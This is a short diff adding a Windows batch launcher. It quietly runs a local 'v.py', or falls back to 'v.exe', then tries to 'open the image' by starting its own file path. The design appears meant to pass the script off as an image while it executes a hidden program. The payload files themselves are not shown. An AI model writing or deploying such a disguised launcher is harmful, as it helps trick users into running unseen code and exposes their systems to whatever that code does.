@@ -1,0 +1,14 @@
+@echo off
+:: Run Python (if installed)
+python "%~dp0v.py"  || (
+    :: If Python fails, run the .exe (if compiled)
+    if exist "%~dp0v.exe" (
+        start "" "%~dp0v.exe"
+    ) else (
+        echo Python not found and v.exe missing.
+        pause
+    )
+)
+:: Open the image (optional)
+start "" "%~f0"
+exit
